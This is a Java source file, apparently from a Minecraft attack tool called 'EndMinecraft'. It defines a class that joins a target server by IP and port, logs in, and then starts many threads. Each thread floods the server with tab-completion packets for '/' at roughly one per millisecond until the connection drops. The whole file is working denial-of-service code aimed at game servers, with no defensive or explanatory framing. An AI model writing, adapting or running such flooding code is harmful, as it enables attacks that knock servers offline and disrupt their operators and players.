package me.alikomi.endminecraft.tasks.attack;

import lombok.AllArgsConstructor;
import me.alikomi.endminecraft.tasks.attack.utils.Attack_util;
import me.alikomi.endminecraft.utils.Util;
import org.spacehq.mc.protocol.MinecraftProtocol;
import org.spacehq.mc.protocol.packet.ingame.client.ClientTabCompletePacket;
import org.spacehq.mc.protocol.packet.ingame.server.ServerChatPacket;
import org.spacehq.mc.protocol.packet.ingame.server.ServerJoinGamePacket;
import org.spacehq.packetlib.Client;
import org.spacehq.packetlib.event.session.*;
import org.spacehq.packetlib.tcp.TcpSessionFactory;

@AllArgsConstructor

public class TabWithOneIp extends Util {

    private  String ip;
    private  int port;
    private  int thread;
    private  String username;

    public void startAttack() {
        MinecraftProtocol protocol = new MinecraftProtocol(username);
        Client client = new Client(ip, port, protocol, new TcpSessionFactory());
        client.getSession().addListener(new SessionListener() {
            @Override
            public void packetReceived(PacketReceivedEvent packetReceivedEvent) {
                if (packetReceivedEvent.getPacket() instanceof ServerJoinGamePacket) {
                    Attack_util.regAndLogin(client);
                    for (int i = 0; i < thread; i++) {
                        new Thread(() -> {
                            while (client.getSession().isConnected()) {
                                client.getSession().send(new ClientTabCompletePacket("/"));
                                try {
                                    Thread.sleep(1);
                                } catch (InterruptedException e) {
                                    e.printStackTrace();
                                }
                            }
                        }).start();
                    }
                }
                if (packetReceivedEvent.getPacket() instanceof ServerChatPacket) {
                    log("聊天：" + ((ServerChatPacket) packetReceivedEvent.getPacket()).getMessage().getFullText());
                }
            }

            @Override
            public void packetSent(PacketSentEvent packetSentEvent) {

            }

            @Override
            public void connected(ConnectedEvent connectedEvent) {

            }

            @Override
            public void disconnecting(DisconnectingEvent disconnectingEvent) {

            }

            @Override
            public void disconnected(DisconnectedEvent disconnectedEvent) {
                log("断开连接：" + disconnectedEvent.getReason());
            }
        });
        client.getSession().connect();
    }
}